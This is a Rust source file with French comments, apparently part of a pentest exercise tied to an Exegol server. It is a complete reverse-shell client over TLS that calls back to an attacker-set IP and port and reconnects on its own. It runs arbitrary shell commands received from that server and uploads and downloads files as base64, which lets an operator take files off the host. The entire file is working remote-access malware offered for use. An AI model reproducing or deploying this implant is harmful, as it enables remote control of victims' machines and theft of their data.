use std::io::{Write, BufRead, BufReader};
use std::net::TcpStream;
use std::process::Command;
use std::path::Path;
use std::{env, fs};
use native_tls::TlsConnector;
use base64::{Engine as _, engine::general_purpose};

// --- CONFIGURATION ---
// Pense à remettre l'IP de ton serveur Exegol ici !
const SERVER_IP: &str = "127.0.0.1"; 
const SERVER_PORT: &str = "4444";

fn main() {
    println!("Démarrage du client Remote Shell...");

    let connector = TlsConnector::builder()
        .danger_accept_invalid_certs(true) 
        .build()
        .unwrap();

    // Boucle de reconnexion automatique
    loop {
        match TcpStream::connect(format!("{}:{}", SERVER_IP, SERVER_PORT)) {
            Ok(stream) => {
                println!("Connecté à {}:{}", SERVER_IP, SERVER_PORT);
                
                match connector.connect(SERVER_IP, stream) {
                    Ok(stream) => {
                        println!("Tunnel TLS sécurisé établi.");
                        
                        // CORRECTION ICI : On ne clone plus !
                        // On donne le stream au BufReader, il en devient propriétaire.
                        let mut reader = BufReader::new(stream);
                        let mut buffer = String::new();

                        loop {
                            buffer.clear();
                            match reader.read_line(&mut buffer) {
                                Ok(n) => {
                                    if n == 0 { break; } // Serveur déconnecté
                                    
                                    let cmd_line = buffer.trim().to_string();
                                    
                                    // CORRECTION ICI : L'ASTUCE DU GET_MUT()
                                    // On demande au reader de nous prêter le stream pour écrire la réponse
                                    let output_stream = reader.get_mut();
                                    
                                    process_command(cmd_line, output_stream);
                                }
                                Err(e) => {
                                    eprintln!("Erreur lecture: {}", e);
                                    break;
                                }
                            }
                        }
                    },
                    Err(e) => eprintln!("Erreur Handshake TLS: {}", e),
                }
            },
            Err(_) => {
                // On attend 5 secondes avant de réessayer
                std::thread::sleep(std::time::Duration::from_secs(5));
            }
        }
    }
}

fn process_command(cmd_line: String, stream: &mut native_tls::TlsStream<TcpStream>) {
    let parts: Vec<&str> = cmd_line.split_whitespace().collect();
    if parts.is_empty() { return; }

    let command = parts[0];
    let args = &parts[1..];

    match command {
        "cd" => {
            let new_dir = if args.is_empty() { "/" } else { args[0] };
            let root = Path::new(new_dir);
            let msg;
            if let Err(e) = env::set_current_dir(&root) {
                msg = format!("Erreur CD: {}", e);
            } else {
                msg = "Repertoire change.".to_string();
            }
            let b64 = general_purpose::STANDARD.encode(msg);
            let _ = stream.write_all(format!("{}\n", b64).as_bytes());
        },
        "upload" => {
            if args.len() >= 2 {
                let b64_data = args[0];
                let filename = args[1];

                let msg;
                match general_purpose::STANDARD.decode(b64_data) {
                    Ok(bytes) => {
                        if let Err(e) = fs::write(filename, bytes) {
                            msg = format!("Erreur écriture disque: {}", e);
                        } else {
                            msg = "Succes: Fichier uploade.".to_string();
                        }
                    },
                    Err(e) => {
                        msg = format!("Erreur décodage Base64: {}", e);
                    }
                }
                let response_b64 = general_purpose::STANDARD.encode(msg);
                let _ = stream.write_all(format!("{}\n", response_b64).as_bytes());

            } else {
                 let err = general_purpose::STANDARD.encode("Erreur protocole upload.");
                 let _ = stream.write_all(format!("{}\n", err).as_bytes());
            }
        },
        "download" => {
            if let Some(filename) = args.get(0) {
                match fs::read(filename) {
                    Ok(data) => {
                        // 1. Encodage Base64
                        let b64 = general_purpose::STANDARD.encode(&data);
                        // 2. Envoi avec \n (CRUCIAL POUR DÉBLOQUER LE SERVEUR)
                        let _ = stream.write_all(format!("{}\n", b64).as_bytes());
                        let _ = stream.flush();
                    },
                    Err(e) => {
                        let error_msg = format!("ERROR: Impossible de lire '{}': {}", filename, e);
                        let b64_err = general_purpose::STANDARD.encode(error_msg);
                        let _ = stream.write_all(format!("{}\n", b64_err).as_bytes());
                    }
                }
            }
        },
        "exit" => {
            std::process::exit(0);
        },
        _ => {
            execute_os_command(command, args, stream);
        }
    }
}

fn execute_os_command(cmd: &str, args: &[&str], stream: &mut native_tls::TlsStream<TcpStream>) {
    let mut full_cmd = cmd.to_string();
    for arg in args {
        full_cmd.push(' ');
        full_cmd.push_str(arg);
    }

    #[cfg(target_os = "windows")]
    let (shell, flag) = ("cmd", "/C");

    #[cfg(not(target_os = "windows"))]
    let (shell, flag) = ("sh", "-c");

    match Command::new(shell).args(&[flag, &full_cmd]).output() {
        Ok(output) => {
            let mut response_bytes = output.stdout;
            if !output.stderr.is_empty() {
                response_bytes.extend_from_slice(b"\n--- STDERR ---\n");
                response_bytes.extend(output.stderr);
            }

            let b64_response = general_purpose::STANDARD.encode(&response_bytes);
            let _ = stream.write_all(format!("{}\n", b64_response).as_bytes());
        },
        Err(e) => {
            let error_msg = format!("Impossible d'exécuter: {}", e);
            let b64_error = general_purpose::STANDARD.encode(error_msg);
            let _ = stream.write_all(format!("{}\n", b64_error).as_bytes());
        }
    }
}